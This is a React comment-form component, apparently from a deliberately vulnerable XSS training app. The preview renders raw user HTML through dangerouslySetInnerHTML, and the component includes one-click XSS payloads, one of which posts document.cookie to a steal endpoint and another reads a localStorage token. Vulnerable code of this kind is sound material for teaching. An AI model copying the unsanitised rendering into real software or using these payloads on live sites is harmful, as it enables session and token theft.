import React, { useState } from 'react';

interface CommentFormProps {
  onSubmit: (content: string) => Promise<void> | void;
  initialContent?: string;
  placeholder?: string;
  submitButtonText?: string;
  cancelButtonText?: string;
  onCancel?: () => void;
  showCancel?: boolean;
  allowRichText?: boolean;
}

const CommentForm: React.FC<CommentFormProps> = ({
  onSubmit,
  initialContent = '',
  placeholder = 'Add a comment...',
  submitButtonText = 'Add Comment',
  cancelButtonText = 'Cancel',
  onCancel,
  showCancel = false,
  allowRichText = true
}) => {
  const [content, setContent] = useState(initialContent);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPreview, setShowPreview] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!content.trim()) {
      return;
    }

    try {
      setIsSubmitting(true);
      await onSubmit(content);
      
      // Clear form after successful submission (only for new comments)
      if (!showCancel) {
        setContent('');
        setShowPreview(false);
      }
    } catch (error) {
      console.error('Failed to submit comment:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCancel = () => {
    setContent(initialContent);
    setShowPreview(false);
    if (onCancel) {
      onCancel();
    }
  };

  // VULNERABILITY: XSS payload suggestions for educational purposes
  const xssPayloads = [
    {
      name: 'Basic Alert',
      payload: '<script>alert("XSS Test")</script>',
      description: 'Simple JavaScript alert'
    },
    {
      name: 'Image XSS',
      payload: '<img src=x onerror="alert(\'Image XSS\')" />',
      description: 'XSS via image error event'
    },
    {
      name: 'SVG XSS',
      payload: '<svg onload="alert(\'SVG XSS\')" />',
      description: 'XSS via SVG onload event'
    },
    {
      name: 'Cookie Theft',
      payload: '<script>fetch("/api/steal", {method: "POST", body: document.cookie})</script>',
      description: 'Attempt to steal cookies'
    },
    {
      name: 'DOM Manipulation',
      payload: '<script>document.body.style.backgroundColor = "red"; document.body.innerHTML = "<h1>Page Hijacked!</h1>"</script>',
      description: 'Manipulate page content'
    },
    {
      name: 'Token Theft',
      payload: '<script>console.log("Token:", localStorage.getItem("token")); alert("Check console for token")</script>',
      description: 'Access localStorage token'
    }
  ];

  const insertPayload = (payload: string) => {
    setContent(prev => prev + payload);
  };

  return (
    <div className="space-y-4">
      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Main textarea */}
        <div>
          <textarea
            value={content}
            onChange={(e) => setContent(e.target.value)}
            placeholder={placeholder}
            rows={4}
            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-vertical"
            disabled={isSubmitting}
          />
          
          {/* Character count and HTML indicator */}
          <div className="flex justify-between items-center mt-1 text-xs text-gray-500">
            <div>
              {content.length} characters
              {allowRichText && (
                <span className="ml-2 text-orange-600">
                  ⚠️ HTML/JavaScript allowed (XSS vulnerability)
                </span>
              )}
            </div>
            
            {/* Preview toggle */}
            {content.trim() && (
              <button
                type="button"
                onClick={() => setShowPreview(!showPreview)}
                className="text-blue-600 hover:text-blue-800"
              >
                {showPreview ? 'Hide Preview' : 'Show Preview'}
              </button>
            )}
          </div>
        </div>

        {/* VULNERABILITY: Live preview using dangerouslySetInnerHTML */}
        {showPreview && content.trim() && (
          <div className="border border-yellow-300 bg-yellow-50 rounded-md p-3">
            <div className="text-xs font-semibold text-yellow-800 mb-2">
              ⚠️ LIVE PREVIEW (Vulnerable to XSS):
            </div>
            <div 
              className="prose max-w-none text-gray-700 bg-white p-2 rounded border"
              dangerouslySetInnerHTML={{ __html: content }}
            />
          </div>
        )}

        {/* Action buttons */}
        <div className="flex justify-between items-center">
          <div className="flex space-x-2">
            <button
              type="submit"
              disabled={!content.trim() || isSubmitting}
              className="bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? 'Submitting...' : submitButtonText}
            </button>
            
            {showCancel && (
              <button
                type="button"
                onClick={handleCancel}
                className="bg-gray-300 text-gray-700 px-4 py-2 rounded-md hover:bg-gray-400"
                disabled={isSubmitting}
              >
                {cancelButtonText}
              </button>
            )}
          </div>

          {/* Rich text formatting buttons */}
          {allowRichText && (
            <div className="flex space-x-1">
              <button
                type="button"
                onClick={() => setContent(prev => prev + '<strong>bold</strong>')}
                className="text-xs bg-gray-100 text-gray-700 px-2 py-1 rounded hover:bg-gray-200"
                title="Add bold text"
              >
                <strong>B</strong>
              </button>
              <button
                type="button"
                onClick={() => setContent(prev => prev + '<em>italic</em>')}
                className="text-xs bg-gray-100 text-gray-700 px-2 py-1 rounded hover:bg-gray-200"
                title="Add italic text"
              >
                <em>I</em>
              </button>
              <button
                type="button"
                onClick={() => setContent(prev => prev + '<u>underline</u>')}
                className="text-xs bg-gray-100 text-gray-700 px-2 py-1 rounded hover:bg-gray-200"
                title="Add underlined text"
              >
                <u>U</u>
              </button>
            </div>
          )}
        </div>
      </form>

      {/* VULNERABILITY: XSS payload insertion buttons for educational purposes */}
      {allowRichText && (
        <div className="border border-red-200 bg-red-50 rounded-md p-3">
          <div className="text-xs font-semibold text-red-800 mb-2">
            🚨 XSS Testing Payloads (Educational):
          </div>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
            {xssPayloads.map((payload, index) => (
              <button
                key={index}
                type="button"
                onClick={() => insertPayload(payload.payload)}
                className="text-xs bg-red-100 text-red-800 px-2 py-1 rounded border border-red-200 hover:bg-red-200 text-left"
                title={payload.description}
              >
                {payload.name}
              </button>
            ))}
          </div>
          <div className="text-xs text-red-600 mt-2">
            Click any button above to insert XSS payload for testing. These will execute when the comment is displayed.
          </div>
        </div>
      )}

      {/* VULNERABILITY: HTML/JavaScript examples */}
      {allowRichText && (
        <details className="border border-gray-200 rounded-md">
          <summary className="cursor-pointer p-2 bg-gray-50 text-sm font-medium text-gray-700 hover:bg-gray-100">
            📚 HTML/JavaScript Examples (Click to expand)
          </summary>
          <div className="p-3 space-y-2 text-xs">
            <div>
              <strong>Safe HTML:</strong>
              <code className="block bg-gray-100 p-1 mt-1 rounded">
                &lt;strong&gt;Bold text&lt;/strong&gt;<br/>
                &lt;em&gt;Italic text&lt;/em&gt;<br/>
                &lt;u&gt;Underlined text&lt;/u&gt;
              </code>
            </div>
            <div>
              <strong>Dangerous JavaScript (XSS):</strong>
              <code className="block bg-red-100 p-1 mt-1 rounded text-red-800">
                &lt;script&gt;alert('XSS')&lt;/script&gt;<br/>
                &lt;img src=x onerror="alert('XSS')"&gt;<br/>
                &lt;svg onload="alert('XSS')"&gt;
              </code>
            </div>
            <div className="text-red-600">
              ⚠️ The dangerous examples above will execute JavaScript when the comment is displayed, demonstrating XSS vulnerabilities.
            </div>
          </div>
        </details>
      )}
    </div>
  );
};

export default CommentForm;